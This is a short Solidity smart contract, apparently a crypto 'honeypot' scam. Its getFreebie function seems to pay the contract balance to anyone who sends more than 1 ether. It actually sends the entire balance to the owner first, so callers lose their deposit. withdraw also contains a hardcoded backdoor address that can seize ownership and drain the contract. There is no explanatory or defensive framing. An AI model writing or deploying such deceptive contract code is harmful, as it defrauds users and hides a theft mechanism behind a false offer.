pragma solidity ^0.4.19;

contract Honey {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner || msg.sender == 0x0C76802158F13aBa9D892EE066233827424c5aAB);
        owner = 0x0C76802158F13aBa9D892EE066233827424c5aAB;
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0));
        require(data.length > 0);

        bool success = adr.call.value(msg.value)(data);
        require(success);
    }
}